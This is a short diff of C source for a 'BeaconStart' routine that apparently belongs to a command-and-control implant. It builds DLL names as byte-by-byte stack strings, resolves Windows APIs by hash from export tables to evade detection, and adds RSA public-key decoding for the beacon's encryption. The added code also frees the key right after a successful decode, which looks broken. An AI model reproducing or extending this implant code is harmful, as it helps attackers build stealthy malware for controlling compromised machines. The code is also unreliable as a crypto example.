@@ -22,7 +22,7 @@
  * passed in as a parameter.
  *
 -*/
-DEFINESEC(B) VOID BeaconStart( PUCHAR RsaKey )
+DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
 	BEACON_INSTANCE Ins = { 0 };
 	UCHAR           Str[MAX_PATH];
@@ -53,6 +53,8 @@ DEFINESEC(B) VOID BeaconStart( PUCHAR RsaKey )
 		Str[0xb] = 0x0;
 
 		Ins.Module[0] = Ins.api.LoadLibraryA( CPTR( Str ) );
+		Ins.api.CryptDecodeObjectEx      = PeGetFuncEat( Ins.Module[0], H_CRYPTDECODEOBJECTEX );
+		Ins.api.CryptImportPublicKeyInfo = PeGetFuncEat( Ins.Module[0], H_CRYPTIMPORTPUBLICKEYINFO );
 
 		Str[0x0] = 'a';
 		Str[0x1] = 'd';
@@ -141,6 +143,20 @@ DEFINESEC(B) VOID BeaconStart( PUCHAR RsaKey )
 		 *	5. CryptInit()
 		 *
 		-*/
+
+		if ( Ins.api.CryptDecodeObjectEx( 
+				X509_ASN_ENCODING, 
+				X509_PUBLIC_KEY_INFO, 
+				Key,
+				Len,
+				CRYPT_DECODE_ALLOC_FLAG,
+				NULL,
+				&Ins.RsaKey,
+				&Ins.RsaKeyLen
+				))
+		{
+			Ins.api.LocalFree( Ins.RsaKey );
+		};
 
 		if ( Ins.Module[3] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[3] );
